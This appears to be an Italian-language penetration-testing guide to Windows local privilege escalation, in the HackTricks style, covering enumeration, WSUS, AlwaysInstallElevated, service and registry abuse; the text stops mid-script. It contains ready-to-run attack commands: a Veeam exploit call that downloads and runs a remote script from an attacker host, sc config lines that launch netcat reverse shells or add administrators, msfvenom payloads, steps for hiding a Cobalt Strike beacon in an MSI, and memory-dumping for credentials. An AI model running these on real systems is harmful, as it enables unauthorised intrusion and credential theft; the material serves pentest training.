# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Miglior tool per cercare vettori di Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Teoria iniziale di Windows

### Access Tokens

**Se non sai cosa sono i Windows Access Tokens, leggi la seguente pagina prima di continuare:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Controlla la seguente pagina per maggiori info su ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Se non sai cosa sono gli integrity levels in Windows dovresti leggere la seguente pagina prima di continuare:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Ci sono diverse cose in Windows che potrebbero **impedirti di enumerare il sistema**, eseguire eseguibili o persino **rilevare le tue attività**. Dovresti **leggere** la seguente **pagina** ed **enumerare** tutti questi **meccanismi** di **difesa** prima di iniziare l'enumerazione per la privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

I processi UIAccess avviati tramite `RAiLaunchAdminProcess` possono essere abusati per raggiungere High IL senza prompt quando i controlli secure-path di AppInfo vengono bypassati. Consulta qui il workflow dedicato al bypass di UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

La propagazione del registro di accessibilità di Secure Desktop può essere abusata per una scrittura arbitraria nel registro di SYSTEM (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Le build recenti di Windows hanno introdotto anche un percorso LPE **SMB arbitrary-port** in cui un'autenticazione NTLM locale privilegiata viene riflessa su una connessione TCP SMB riutilizzata:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Info di sistema

### Enumerazione delle informazioni di versione

Controlla se la versione di Windows ha qualche vulnerabilità nota (controlla anche le patch applicate).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploits delle Versioni

This [site](https://msrc.microsoft.com/update-guide/vulnerability) è utile per cercare informazioni dettagliate sulle vulnerabilità di sicurezza Microsoft. Questo database ha più di 4,700 vulnerabilità di sicurezza, mostrando la **massive attack surface** che un ambiente Windows presenta.

**Sul sistema**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Localmente con informazioni di sistema**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repository Github di exploit:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Qualche credenziale/info juicy salvata nelle variabili d'ambiente?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Cronologia di PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### File di trascrizione PowerShell

Puoi imparare come attivarlo in [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

I dettagli delle esecuzioni della pipeline di PowerShell vengono registrati, includendo i comandi eseguiti, le invocazioni dei comandi e parti degli script. Tuttavia, i dettagli completi dell'esecuzione e i risultati dell'output potrebbero non essere acquisiti.

Per abilitarlo, segui le istruzioni nella sezione "Transcript files" della documentazione, scegliendo **"Module Logging"** invece di **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Per visualizzare gli ultimi 15 eventi dai log di PowersShell puoi eseguire:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Viene acquisito un record completo dell'attività e del contenuto completo dell'esecuzione dello script, assicurando che ogni blocco di codice venga documentato mentre viene eseguito. Questo processo conserva una traccia di audit completa di ogni attività, utile per la forensics e per analizzare comportamenti malevoli. Documentando tutta l'attività al momento dell'esecuzione, vengono forniti dettagli approfonditi sul processo.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Gli eventi di logging per lo Script Block possono essere trovati nel Windows Event Viewer nel percorso: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Per visualizzare gli ultimi 20 eventi puoi usare:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Impostazioni Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Drive
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Puoi compromettere il sistema se gli aggiornamenti non vengono richiesti usando http**S** ma http.

Inizia verificando se la rete usa un aggiornamento WSUS non-SSL eseguendo quanto segue in cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Oppure il seguente in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Se ricevi una risposta come una di queste:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
E se `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oppure `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` è uguale a `1`.

Allora, **è exploitable.** Se l'ultimo registry è uguale a 0, allora la voce WSUS verrà ignorata.

Per exploitare queste vulnerabilities puoi usare tool come: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Questi sono script di exploit MiTM weaponized per injectare 'fake' updates nel traffico WSUS non-SSL.

Leggi la ricerca qui:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Leggi il report completo qui**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Fondamentalmente, questo è il flaw che questo bug exploita:

> Se abbiamo il potere di modificare il nostro proxy locale user, e Windows Updates usa il proxy configurato nelle impostazioni di Internet Explorer, quindi abbiamo il potere di eseguire [PyWSUS](https://github.com/GoSecure/pywsus) localmente per intercettare il nostro traffico e eseguire code come un utente elevato sul nostro asset.
>
> Inoltre, poiché il servizio WSUS usa le impostazioni dell'utente corrente, userà anche il suo certificate store. Se generiamo un certificato self-signed per l'hostname WSUS e aggiungiamo questo certificato nel certificate store dell'utente corrente, potremo intercettare sia il traffico WSUS HTTP che HTTPS. WSUS non usa meccanismi tipo HSTS per implementare una validazione trust-on-first-use sul certificato. Se il certificato presentato è trusted dall'utente e ha l'hostname corretto, verrà accettato dal servizio.

Puoi exploitare questa vulnerability usando il tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (una volta che è liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Molti agent enterprise espongono una superficie IPC localhost e un canale di update privilegiato. Se l'enrollment può essere forzato verso un attacker server e l'updater si fida di una rogue root CA o di weak signer checks, un utente locale può consegnare un MSI malevolo che il servizio SYSTEM installa. Vedi una tecnica generalizzata (basata sulla chain Netskope stAgentSvc – CVE-2025-0309) qui:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` espone un servizio localhost su **TCP/9401** che processa messaggi controllati dall'attacker, consentendo command arbitrari come **NT AUTHORITY\SYSTEM**.

- **Recon**: conferma il listener e la versione, ad esempio, `netstat -ano | findstr 9401` e `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: posiziona un PoC come `VeeamHax.exe` con le DLL Veeam richieste nella stessa directory, poi attiva un payload SYSTEM sul socket locale:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Il servizio esegue il comando come SYSTEM.
## KrbRelayUp

Esiste una vulnerabilità di **local privilege escalation** negli ambienti **domain** di Windows in condizioni specifiche. Queste condizioni includono ambienti in cui **LDAP signing is not enforced,** gli utenti possiedono self-rights che consentono di configurare **Resource-Based Constrained Delegation (RBCD),** e la possibilità per gli utenti di creare computer all'interno del domain. È importante notare che questi **requirements** sono soddisfatti usando le **default settings**.

Trova l'**exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Per maggiori informazioni sul flusso dell'attacco consulta [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Se** questi 2 register sono **abilitati** (il valore è **0x1**), allora gli utenti di qualsiasi privilegio possono **installare** (eseguire) file `*.msi` come NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Payload di Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Se hai una sessione meterpreter puoi automatizzare questa tecnica usando il modulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Usa il comando `Write-UserAddMSI` di power-up per creare nella directory corrente un binario MSI di Windows per elevare i privilegi. Questo script scrive un installer MSI precompilato che chiede l’aggiunta di un utente/gruppo (quindi avrai bisogno di accesso GIU):
```
Write-UserAddMSI
```
Esegui semplicemente il binario creato per elevare i privilegi.

### MSI Wrapper

Leggi questo tutorial per imparare come creare un wrapper MSI usando questo strumento. Nota che puoi wrappare un file "**.bat**" se vuoi **solo** **eseguire** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Crea MSI con WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Crea MSI con Visual Studio

- **Genera** con Cobalt Strike o Metasploit un **nuovo payload Windows EXE TCP** in `C:\privesc\beacon.exe`
- Apri **Visual Studio**, seleziona **Create a new project** e digita "installer" nella casella di ricerca. Seleziona il progetto **Setup Wizard** e clicca **Next**.
- Assegna al progetto un nome, ad esempio **AlwaysPrivesc**, usa **`C:\privesc`** come percorso, seleziona **place solution and project in the same directory** e clicca **Create**.
- Continua a cliccare **Next** finché non arrivi al punto 3 di 4 (choose files to include). Clicca **Add** e seleziona il payload Beacon che hai appena generato. Poi clicca **Finish**.
- Evidenzia il progetto **AlwaysPrivesc** in **Solution Explorer** e, nelle **Properties**, cambia **TargetPlatform** da **x86** a **x64**.
- Ci sono altre proprietà che puoi cambiare, come **Author** e **Manufacturer**, che possono rendere l'app installata più legittima.
- Fai clic destro sul progetto e seleziona **View > Custom Actions**.
- Fai clic destro su **Install** e seleziona **Add Custom Action**.
- Fai doppio clic su **Application Folder**, seleziona il file **beacon.exe** e clicca **OK**. Questo garantirà che il payload Beacon venga eseguito non appena l'installer viene avviato.
- In **Custom Action Properties**, cambia **Run64Bit** in **True**.
- Infine, **build it**.
- Se viene mostrato l'avviso `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, assicurati di impostare la piattaforma su x64.

### Installazione MSI

Per eseguire l'**installazione** del file `.msi` malevolo in **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Per sfruttare questa vulnerabilità puoi usare: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

Queste impostazioni decidono cosa viene **registrato**, quindi dovresti prestare attenzione
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding è interessante per sapere dove vengono inviati i log
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** è progettato per la **gestione delle password dell'amministratore locale**, garantendo che ogni password sia **unica, casuale e aggiornata regolarmente** sui computer joined a un domain. Queste password sono archiviate in modo sicuro all'interno di Active Directory e possono essere accessibili solo dagli utenti a cui sono stati concessi permessi sufficienti tramite ACLs, consentendo loro di visualizzare le password dell'admin locale se autorizzati.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Se attivo, le **password in chiaro sono memorizzate in LSASS** (Local Security Authority Subsystem Service).\
[**Ulteriori informazioni su WDigest in questa pagina**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Protezione LSA

A partire da **Windows 8.1**, Microsoft ha introdotto una protezione migliorata per la Local Security Authority (LSA) per **bloccare** i tentativi di processi non attendibili di **leggere la sua memoria** o iniettare codice, rafforzando ulteriormente la sicurezza del sistema.\
[**Maggiori informazioni sulla Protezione LSA qui**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** è stato introdotto in **Windows 10**. Il suo scopo è proteggere le credenziali archiviate su un dispositivo da minacce come gli attacchi pass-the-hash.| [**Più informazioni su Credentials Guard qui.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Credenziali in cache

Le **credenziali di dominio** sono autenticate dalla **Local Security Authority** (LSA) e utilizzate dai componenti del sistema operativo. Quando i dati di accesso di un utente vengono autenticati da un security package registrato, in genere vengono stabilite le credenziali di dominio per l'utente.\
[**Maggiori informazioni sulle Cached Credentials qui**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Users & Groups

### Enumerate Users & Groups

Dovresti verificare se uno dei gruppi di cui fai parte ha permessi interessanti
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Gruppi privilegiati

Se **appartieni a qualche gruppo privilegiato potresti essere in grado di elevare i privilegi**. Scopri di più sui gruppi privilegiati e su come abusarne per elevare i privilegi qui:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipolazione dei token

**Scopri di più** su cos’è un **token** in questa pagina: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Controlla la seguente pagina per **scoprire token interessanti** e come abusarne:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Utenti loggati / Sessioni
```bash
qwinsta
klist sessions
```
### Cartelle home
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Policy delle Password
```bash
net accounts
```
### Ottieni il contenuto degli appunti
```bash
powershell -command "Get-Clipboard"
```
## Processi in esecuzione

### Permessi di file e cartelle

Prima di tutto, elencando i processi **controlla se ci sono password nella command line del processo**.\
Verifica se puoi **sovrascrivere qualche binary in esecuzione** oppure se hai permessi di scrittura sulla cartella del binary per sfruttare possibili [**attacchi DLL Hijacking**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Controlla sempre se ci sono possibili [**electron/cef/chromium debuggers** in esecuzione, potresti abusarne per elevare i privilegi](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Controllo dei permessi dei binari dei processi**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Controllo dei permessi delle cartelle dei binari dei processi (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Puoi creare un memory dump di un processo in esecuzione usando **procdump** di sysinternals. Servizi come FTP hanno le **credentials in clear text in memory**, prova a fare il dump della memoria e leggere le credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Applicazioni GUI insicure

**Le applicazioni in esecuzione come SYSTEM possono consentire a un utente di avviare un CMD, o esplorare directory.**

Esempio: "Windows Help and Support" (Windows + F1), cerca "command prompt", clicca su "Click to open Command Prompt"

## Services

Service Triggers consentono a Windows di avviare un service quando si verificano determinate condizioni (attività named pipe/RPC endpoint, eventi ETW, disponibilità IP, arrivo di device, refresh GPO, ecc.). Anche senza diritti SERVICE_START puoi spesso avviare service privilegiati attivando i loro trigger. Vedi qui le tecniche di enumerazione e attivazione:

-
{{#ref}}
service-triggers.md
{{#endref}}

Ottieni una lista di services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permessi

Puoi usare **sc** per ottenere informazioni di un servizio
```bash
sc qc <service_name>
```
Si consiglia di avere il binario **accesschk** di _Sysinternals_ per verificare il livello di privilegio richiesto per ogni servizio.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Si consiglia di verificare se "Authenticated Users" possono modificare qualsiasi servizio:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Puoi scaricare accesschk.exe per XP da qui](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Abilita servizio

Se stai riscontrando questo errore (ad esempio con SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Puoi abilitarlo usando
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Tieni presente che il servizio upnphost dipende da SSDPSRV per funzionare (per XP SP1)**

**Un altro workaround** di questo problema è eseguire:
```
sc.exe config usosvc start= auto
```
### **Modifica del percorso del binario del servizio**

Nel caso in cui il gruppo "Authenticated users" possieda **SERVICE_ALL_ACCESS** su un servizio, è possibile modificare il binario eseguibile del servizio. Per modificare ed eseguire **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Riavvia il servizio
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
I privilegi possono essere elevati tramite varie autorizzazioni:

- **SERVICE_CHANGE_CONFIG**: Consente la riconfigurazione del binario del servizio.
- **WRITE_DAC**: Abilita la riconfigurazione dei permessi, portando alla possibilità di modificare le configurazioni del servizio.
- **WRITE_OWNER**: Consente l’acquisizione della proprietà e la riconfigurazione dei permessi.
- **GENERIC_WRITE**: Eredita la capacità di modificare le configurazioni del servizio.
- **GENERIC_ALL**: Eredita anch’essa la capacità di modificare le configurazioni del servizio.

Per il rilevamento e lo sfruttamento di questa vulnerabilità, si può utilizzare _exploit/windows/local/service_permissions_.

### Services binaries weak permissions

Se un servizio viene eseguito come **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, o come un account di dominio privilegiato, ma **gli utenti con pochi privilegi possono modificare l'EXE del servizio o la sua cartella padre**, il servizio può spesso essere hijacked **sostituendo il binario e riavviando il servizio**.

**Controlla se puoi modificare il binario eseguito da un servizio** o se hai **permessi di scrittura sulla cartella** in cui si trova il binario ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Puoi ottenere tutti i binari eseguiti da un servizio usando **wmic** (non in system32) e verificare i tuoi permessi usando **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Puoi anche usare **sc** e **icacls**:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Cerca ACL pericolosi concessi a **`Everyone`**, **`BUILTIN\Users`** o **`Authenticated Users`**, soprattutto **`(F)`**, **`(M)`** o **`(W)`** sull'eseguibile del servizio o sulla directory che lo contiene. Un flusso pratico di abuso è:

1. Conferma l'account del servizio e il path dell'eseguibile con `sc qc <service_name>`.
2. Conferma che il binario sia scrivibile con `icacls <path>`.
3. Sostituisci il binario del servizio con un payload o con un valido binario di servizio malevolo.
4. Riavvia il servizio con `sc stop <service_name> && sc start <service_name>` (oppure attendi un reboot / un trigger del servizio).

Controlli automatici utili:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Se il servizio non consente a un utente normale di riavviarlo, verifica se si avvia automaticamente all'avvio, se ha un'azione di failure che lo rilancia, o se può essere attivato indirettamente dall'applicazione che lo usa.

### Services registry modify permissions

Dovresti controllare se puoi modificare qualche service registry.\
Puoi **verificare** i tuoi **permessi** su un service **registry** facendo:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Dovrebbe essere verificato se **Authenticated Users** o **NT AUTHORITY\INTERACTIVE** possiedono permessi `FullControl`. In tal caso, il binario eseguito dal servizio può essere modificato.

Per cambiare il Path del binario eseguito:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Alcune funzionalità di Accessibilità di Windows creano chiavi **ATConfig** per singolo utente che vengono poi copiate da un processo **SYSTEM** in una chiave di sessione HKLM. Una **symbolic link race** nel registry può reindirizzare quella scrittura privilegiata verso **qualsiasi percorso HKLM**, offrendo una primitive di **value write** arbitraria su HKLM.

Percorsi chiave (esempio: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` elenca le funzionalità di accessibilità installate.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` memorizza la configurazione controllata dall'utente.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` viene creata durante le transizioni di logon/secure-desktop ed è scrivibile dall'utente.

Flusso di abuso (CVE-2026-24291 / ATConfig):

1. Popola il valore **HKCU ATConfig** che vuoi venga scritto da SYSTEM.
2. Attiva la copia su secure-desktop (ad es. **LockWorkstation**), che avvia il flusso del broker AT.
3. **Vinci la race** mettendo un **oplock** su `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; quando l'oplock scatta, sostituisci la chiave **HKLM Session ATConfig** con un **registry link** verso un target HKLM protetto.
4. SYSTEM scrive il valore scelto dall'attaccante nel percorso HKLM reindirizzato.

Una volta ottenuta una scrittura arbitraria di valori HKLM, fai pivot verso LPE sovrascrivendo i valori di configurazione di un servizio:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Scegli un servizio che un utente normale può avviare (ad es. **`msiserver`**) e attivalo dopo la scrittura. **Nota:** l'implementazione pubblica dell'exploit **blocca la workstation** come parte della race.

Esempio di tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Servizi registry AppendData/AddSubdirectory permissions

Se hai questo permesso su un registry significa che **puoi creare sub registries da questo**. Nel caso dei servizi Windows questo è **sufficiente per eseguire codice arbitrario:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Se il percorso di un eseguibile non è racchiuso tra virgolette, Windows proverà a eseguire ogni parte finale prima di uno spazio.

Per esempio, per il percorso _C:\Program Files\Some Folder\Service.exe_ Windows proverà a eseguire:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Elenca tutti i service path non quotati, escludendo quelli che appartengono ai servizi Windows integrati:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
